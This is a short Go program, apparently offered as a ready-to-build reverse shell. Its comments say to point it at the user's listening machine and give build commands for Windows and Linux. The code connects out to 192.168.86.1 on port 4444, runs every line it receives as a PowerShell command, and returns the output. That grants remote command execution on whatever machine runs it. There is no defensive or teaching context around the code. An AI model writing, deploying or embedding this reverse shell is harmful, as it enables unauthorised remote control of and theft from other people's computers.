// Change the IP address to your listening machine. This has been tested with netcat.
// To build for Windows use 'env GOOS=windows GOARCH=your_arch_here go build reverse_shell.go'
// To build for Linux use 'env GOOS=linux GOARCH=your_arch_here go build reverse_shell.go

package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

func main() {
	conn, _ := net.Dial("tcp", "192.168.86.1:4444")
	for {

		message, _ := bufio.NewReader(conn).ReadString('\n')

		out, err := exec.Command("powershell.exe", strings.TrimSuffix(message, "\n")).Output()

		if err != nil {
			fmt.Fprintf(conn, "%s\n", err)
		}

		fmt.Fprintf(conn, "%s\n", out)
	}
}
